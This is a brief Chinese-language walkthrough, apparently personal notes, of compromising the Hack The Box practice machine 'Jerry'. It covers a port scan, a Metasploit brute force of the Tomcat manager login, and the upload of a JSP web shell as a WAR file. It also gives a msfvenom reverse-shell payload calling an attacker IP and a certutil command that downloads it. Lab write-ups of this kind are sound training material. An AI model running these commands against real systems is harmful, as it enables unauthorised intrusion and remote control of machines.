# Jerry
- URL : https://app.hackthebox.eu/machines/144
- IP :10.129.1.110

## Scan
- 掃 Port
	- rustscan -a 10.129.1.110 -r 1-65535
	- ![](https://i.imgur.com/Eo7xo0g.png)
	- 發現有開8080
## Brute Force
- 嘗試 msf 爆破
	- `auxiliary/scanner/http/tomcat_mgr_login`
	- 發現密碼是 `tomcat:s3cret`
    - ![](https://i.imgur.com/cxpZApC.png)
- Wordlist
    - /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
    - /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
## 進入 Manager APP
- 發現不登入直接按 Manager App 就可以進後台ㄌ= =
    - ![](https://i.imgur.com/NsGdRoj.png)
    - ![](https://i.imgur.com/LQwHTzl.png)
    - ![](https://i.imgur.com/F8NaHMz.png)
## Web shell
- 準備 jsp web shell
    - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
        - ![](https://i.imgur.com/nOjaVlZ.png)
    - `jar -cvf cmd.war cmd.jsp`
        - ![](https://i.imgur.com/777lPwk.png)
- 上傳 webshell
    - ![](https://i.imgur.com/6fmGHir.png)
- 執行 webshell
    - ![](https://i.imgur.com/olnHhyd.png)
    - 發現本來就是 system 權限
- 確認系統資料
    - ![](https://i.imgur.com/Ue6dTUE.png)
    - 64 bit
## Reverse shell
- 準備 Reverse shell
    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7877 -f exe > shell.exe`
- 下載 reverse shell
    - `certutil -urlcache -f http://10.10.16.35/shell.exe shell8787.exe`
    - ![](https://i.imgur.com/OI4Au01.png)
- 執行 Reverse shell
    - ![](https://i.imgur.com/RXZuM8K.png)
- 取得 Flag
    - ![](https://i.imgur.com/lficF3v.png)
    - ![](https://i.imgur.com/pSWHq2O.png)
